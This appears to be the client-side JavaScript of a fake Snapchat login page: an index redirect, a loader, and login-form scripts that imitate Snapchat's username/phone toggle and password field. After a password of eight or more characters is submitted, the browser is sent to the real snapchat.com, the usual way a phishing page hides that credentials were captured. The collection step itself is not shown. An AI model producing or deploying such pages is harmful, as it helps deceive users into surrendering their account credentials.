  
  //script of index.html file
  
  // Redirect to the main index page after a delay (e.g., 3 seconds)
  setTimeout(function() {
    window.location.href = "/Acconts.html"; // Redirect to your main index page
}, 2400); // 3000ms = 3 seconds



//script of account.html file



    // Ensure the loader hides when the page fully loads
    window.onload = function () {
      // Add the 'loaded' class to the body to hide the loader
      document.body.classList.add('loaded');
    };



//script of login.html file


function validatePassword(event) {
  const passwordInput = document.getElementById('password');
  const incorrectMessage = document.querySelector('.incorrect');
  
  // Check if password is less than 8 characters
  if (passwordInput.value.length < 8) {
    incorrectMessage.style.display = 'block';  // Show error message
    event.preventDefault();  // Prevent form submission
    return false;  // Prevent further actions (redirect)
  } else {
    incorrectMessage.style.display = 'none';  // Hide error message if password is valid
    redirectToSnapchat();  // Call the redirect function if password is valid
    return true;  // Allow form submission
  }
}

function redirectToSnapchat() {
  // Wait briefly to ensure the form is submitted
  setTimeout(function () {
    window.location.href = "https://www.snapchat.com/";
  }, 1000); // Redirect after 1 second
}


// Toggle password visibility with dynamic image for show/hide
document.querySelector('.toggle-password').addEventListener('click', function () {
const passwordField = document.getElementById('password');
const eyeIcon = document.getElementById('eye-icon');

if (passwordField.type === 'password') {
  passwordField.type = 'text';
  eyeIcon.src = 'img/eye-open.svg';  // Update to the open eye icon
} else {
  passwordField.type = 'password';
  eyeIcon.src = 'img/eye-closed.svg';  // Update to the closed eye icon
}
});

// Switch between username/email and phone number
const switchToPhone = document.getElementById('switch-to-phone');
const usernameInput = document.getElementById('username');
const label = document.querySelector('label[for="username"]');

switchToPhone.addEventListener('click', function () {
if (label.textContent === 'USERNAME OR EMAIL') {
  label.textContent = 'PHONE NUMBER';
  usernameInput.type = 'tel';

  switchToPhone.textContent = 'Use email instead';
} else {
  label.textContent = 'USERNAME OR EMAIL';
  usernameInput.type = 'text';

  switchToPhone.textContent = 'Use phone number instead';
}
});


  window.onload = function() {
  var errorMessage = document.getElementById('error-message');
  errorMessage.style.display = 'block'; // Display the message

  // Hide the error message after user clicks anywhere on the page
  document.body.addEventListener('click', function() {
      errorMessage.style.display = 'none';
  });
};
